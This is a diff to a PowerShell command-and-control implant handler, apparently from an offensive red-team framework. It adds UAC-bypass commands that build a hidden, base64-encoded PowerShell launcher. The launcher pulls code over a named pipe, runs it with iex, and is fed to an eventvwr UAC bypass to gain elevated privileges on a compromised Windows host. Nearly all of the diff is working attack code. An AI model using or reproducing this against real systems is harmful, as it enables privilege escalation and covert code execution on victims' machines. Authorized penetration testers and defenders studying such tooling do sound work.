@@ -137,6 +137,8 @@ function Implant-Handler
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Invoke-AllChecks" -ForegroundColor Green
+        write-host " Invoke-UACBypass" -ForegroundColor Green
+        write-host " Invoke-UACBypassProxy" -ForegroundColor Green
         write-host ' Get-MSHotfix|Where-Object {$_.HotfixID -match "KB3139914"}' -ForegroundColor Green
         write-host " Invoke-MS16-032" -ForegroundColor Green 
         write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
@@ -847,7 +849,32 @@ $error.clear()
                 $pscommand = 'fvdsghfdsyyh'
                 }
             }
-            # write-host " Get-System | Get-System-WithProxy" -ForegroundColor Green 
+            if ($pscommand -eq 'invoke-uacbypassproxy')
+            { 
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                    CheckModuleLoaded "ProxyPayload.ps1" $psrandomuri
+                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                    CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
+                    $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
+                    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+                    $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
+                } else {
+                    write-host "Need to run CreateProxyPayload first"
+                    $pscommand = 'fvdsghfdsyyh'
+                }            
+            }
+            if ($pscommand -eq 'invoke-uacbypass')
+            { 
+                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"  
+                CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+                $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
+                $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+                $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`""               
+            } 
+ 
             if ($pscommand -eq 'Get-System') 
             {
                 $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
